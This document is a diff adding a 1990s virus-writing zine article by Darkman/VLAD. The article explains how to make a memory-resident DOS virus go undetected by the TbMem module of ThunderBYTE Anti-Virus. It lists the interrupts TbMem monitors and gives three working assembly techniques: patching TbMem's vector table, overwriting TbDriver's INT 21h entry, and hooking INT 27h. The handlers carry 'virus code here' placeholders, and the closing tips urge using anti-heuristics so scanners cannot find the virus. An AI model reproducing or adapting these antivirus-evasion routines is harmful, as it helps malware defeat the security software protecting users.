@@ -1,0 +1,317 @@
+			 
+			 T B M E M   F L A W S
+			       Written by
+			      Darkman/VLAD
+
+
+ÄÄÄÄÄÄÄÄÄÄÄÄ
+Introduction
+ÄÄÄÄÄÄÄÄÄÄÄÄ
+
+  This document is another example of how to make a program resident in memory
+without the memory resident of ThunderBYTE Anti-Virus: TbMem detects it. This
+document also covers which interrupts are hooked by TbMem and which interrupts
+are monitored by TbMem. All examples in this document will hook interrupt 21h.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Thunderbyte B.V. about TbMem
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+     Controlling memory: TbMem
+
+     TbMem detects attempts from programs to remain resident in memory, and
+     ensures that no program can remain resident in memory without permis-
+     sion. Since most viruses remain resident in memory, this is a powerful
+     weapon against all such viruses, known or unknown. Permission informa-
+     tion is maintained in the Anti-Vir.Dat files. TbMem also protects your
+     CMOS memory against unwanted modifications.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Interrupts hooked by TbMem
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+These interrupts are hooked by TbMem:
+					   
+  INT 09h (IRQ 1  Keyboard)                [TBSeg:0269]
+  INT 2Fh (Software Multiplex)             [TBSeg:00DB]
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Interrupts monitored by TbMem
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+These interrupts are monitored by TbMem:
+
+  INT 08h (IRQ 0  System timer)            [TBSeg:0060]
+  INT 09h (IRQ 1  Keyboard)                [TBSeg:0064]
+  INT 10h (BIOS System Video Services)     [TBSeg:0068]
+  INT 13h (BIOS Fixed disk/FDD Services)   [TBSeg:004C]
+  INT 15h (BIOS System Services)           [TBSeg:0088]
+  INT 16h (BIOS Keyboard Services)         [TBSeg:006C]
+  INT 17h (BIOS Printer Services (LPT))    [TBSeg:007C]
+  INT 1Ah (BIOS Real-Time Clock Services)  [TBSeg:0074]
+  INT 1Ch (BIOS User Timer Tick)           [TBSeg:005C]
+  INT 20h (DOS Program Terminate)          [TBSeg:0050]
+  INT 21h (DOS Function call)              [TBSeg:0054]
+  INT 26h (DOS Absolute Disk Write)        [TBSeg:0090]
+  INT 28h (DOS Idle)                       [TBSeg:0070]
+  INT 29h (DOS Fast Console Output)        [TBSeg:0078]
+  INT 2Ah (Local Area Network)             [TBSeg:0098]
+  INT 2Fh (Software Multiplex)             [TBSeg:0058]
+  INT 40h (BIOS Diskette Service)          [TBSeg:008C]
+  INT 50h (BIOS Reserved)                  [TBSeg:0094]
+  INT 70h (IRQ 8  AT Real Time Clock)      [TBSeg:0080]
+  INT 76h (IRQ 14 AT Fixed Disk)           [TBSeg:0084]
+
+  TbMem will also warn the user if INT 27h (DOS Terminate and Stay Res.) or
+INT 21h, function 31h (DOS Function call, Terminate but stay resident) is
+called.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+How to trick TbMem 1/3
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+The below code must be included to trick TbMem 1/3:
+
+  1. Hook interrupt 21h.
+  2. Modify TbMems interrupt vector table.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Hook interrupt 21h
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+The below code shows an example of how to hook interrupt 21h:
+
+;------------------------------------------------------------=< cut here >=---
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt table
+	     lea     di,int21adr         ; DI = offset of int21adr
+	     mov     si,(21h*04h)        ; SI = offset of interrupt 21h
+	     movsw                       ; Store address of interrupt 21h \
+	     movsw                       ; in int21adr                    /
+	     mov     word ptr ds:[21h*04h],offset int21handler
+	     mov     ds:[21h*04h+02h],es ; Intercept interrupt 21h
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=---
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Modify TbMems interrupt vector table
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+  The below code shows an example of how to modify TbMems interrupt vector
+table:
+
+;------------------------------------------------------------=< cut here >=---
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+	     mov     ds,ds:[09h*04+02h]  ; DS = Segment of TbMem
+	     mov     word ptr ds:[0054h],offset int21handler
+	     mov     ds:[0056h],es       ; Modify the segment of interrupt 21h
+	     push    ds                  ; Save DS at stack
+;------------------------------------------------------------=< cut here >=---
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+How to trick TbMem 2/3
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+
+The below code must be included to trick TbMem 2/3:
+
+  1. Installation check.
+  2. Hook interrupt 60h.
+  3. Modify TbDrivers interrupt 21h.
+  4. Interrupt 60h handler.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Installation check
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+
+  The below code shows an example of how to check if the trick allready has
+been installed:
+
+;------------------------------------------------------------=< cut here >=---
+	     mov     ax,63ffh            ; Interrupt 21h service
+	     int     21h                 ; Do it!
+	     cmp     ax,bx               ; Already resident?
+	     je      trickexit           ; Equal? Jump to trickexit
+
+; Trick TbMem here...
+
+trickexit:
+;------------------------------------------------------------=< cut here >=---
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Hook interrupt 60h
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+The below code shows an example of how to hook interrupt 60h:
+
+;------------------------------------------------------------=< cut here >=---
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt table
+	     mov     word ptr ds:[60h*04h],offset int60handler
+	     mov     ds:[60h*04h+02h],es ; Intercept interrupt 60h
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=---
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Modify TbDrivers interrupt 21h
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+The below code shows an example of how to modify TbDrivers interrupt 21h:
+
+;------------------------------------------------------------=< cut here >=---
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+	     lds     si,ds:[21h*04h]     ; Get address of interrupt 21h
+	     mov     [si],060cdh         ; Write a INT 60h instruction
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=---
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Interrupt 60h handler
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+
+The below code shows an example of an interrupt 60h handler:
+
+;------------------------------------------------------------=< cut here >=---
+int60handler proc    near                ; Interrupt 60h handler
+	     cmp     ax,63ffh            ; Interrupt 60h service?
+	     je      int60servi          ; Equal? Jump to int60servi
+
+; Virus code here...
+
+	     iret                        ; Interrupt return!
+int60servi:
+	     mov     bx,ax
+	     iret                        ; Interrupt return!
+	     endp
+;------------------------------------------------------------=< cut here >=---
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+How to trick TbMem 3/3
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+
+The below code must be included to trick TbMem 3/3:
+
+  1. Installation check.
+  2, Hook interrupt 27h.
+  3. Interrupt 27h handler.
+  4. Interrupt 21h handler.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Installation check
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+
+  The below code shows an example of how to check if the trick allready has
+been installed:
+
+;------------------------------------------------------------=< cut here >=---
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+	     lds     si,ds:[27h*04h]     ; Get address of interrupt 27h
+	     cmp     [si],5350h          ; Interrupt 27h hooked?
+	     pop     ds                  ; Load DS from stack
+	     je      trickexit           ; Already hooked? Jump to trickexit
+
+; Trick TbMem here...
+
+trickexit:
+;------------------------------------------------------------=< cut here >=---
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Hook interrupt 27h
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+
+The below code shows an example of how to hook interrupt 27h:
+
+;------------------------------------------------------------=< cut here >=---
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt table
+	     lea     di,int27adr         ; DI = offset of int27adr
+	     mov     si,(27h*04h)        ; SI = offset of interrupt 27h
+	     movsw                       ; Store address of interrupt 27h \
+	     movsw                       ; in int27adr                    /
+	     mov     word ptr ds:[27h*04h],offset int27handler
+	     mov     ds:[27h*04h+02h],es ; Intercept interrupt 27h
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=---
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Interrupt 27h handler
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+
+The below code shows an example of an interrupt 27h handler:
+
+;------------------------------------------------------------=< cut here >=---
+int27handler proc    near                ; Interrupt 27h handler
+	     push    ax                  ; Save AX at stack
+	     push    bx                  ; Save BX at stack
+
+	     mov     ax,63feh            ; Interrupt 21h service
+	     int     21h                 ; Do it!
+	     cmp     ax,bx               ; Already resident?
+	     je      int27exit           ; Equal? Jump to int27exit
+
+	     push    di                  ; Save DI at stack
+	     push    si                  ; Save SI at stack
+	     push    ds                  ; Save DS at stack
+	     push    es                  ; Save ES at stack
+
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt table
+	     push    cs                  ; Save CS at stack
+	     pop     es                  ; Load ES from stack
+	     lea     di,int21adr         ; DI = offset of int21adr
+	     mov     si,(21h*04h)        ; SI = offset of interrupt 21h
+	     movsw                       ; Store address of interrupt 21h \
+	     movsw                       ; in int21adr                    /
+	     mov     word ptr ds:[21h*04h],offset int21handler
+	     mov     ds:[21h*04h+02h],cs ; Intercept interrupt 21h
+
+	     pop     es                  ; Load ES from stack
+	     pop     ds                  ; Load DS from stack
+	     pop     si                  ; Load SI from stack
+	     pop     di                  ; Load DI from stack
+int27exit:
+	     pop     bx                  ; Load BX from stack
+	     pop     ax                  ; Load AX from stack
+
+	     db      0eah                ; Object code of jump far
+int27adr     dd      ?                   ; Address of interrupt 27h
+	     endp
+;------------------------------------------------------------=< cut here >=---
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Interrupt 21h handler
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+
+The below code shows an example of an interrupt 21h handler:
+
+;------------------------------------------------------------=< cut here >=---
+int21handler proc    near                ; Interrupt 21h handler
+	     cmp     ax,63feh            ; Interrupt 21h service?
+	     je      int21servi          ; Equal? Jump to int21servi
+
+; Virus code here...
+
+	     db      0eah                ; Object code of jump far
+int21adr     dd      ?                   ; Address of interrupt 21h
+int21servi:
+	     mov     bx,ax
+	     iret                        ; Interrupt return!
+	     endp
+;------------------------------------------------------------=< cut here >=---
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+Final tips and tricks
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+
+- Detect TbMem before using these tricks.
+- These examples were tested with ThunderBYTE Anti-Virus v 6.32.
+- Use a lot anti-heuristics, so other programs can't find the virus either.
+- Look also at Catch-22 by Rhincewind/VLAD.
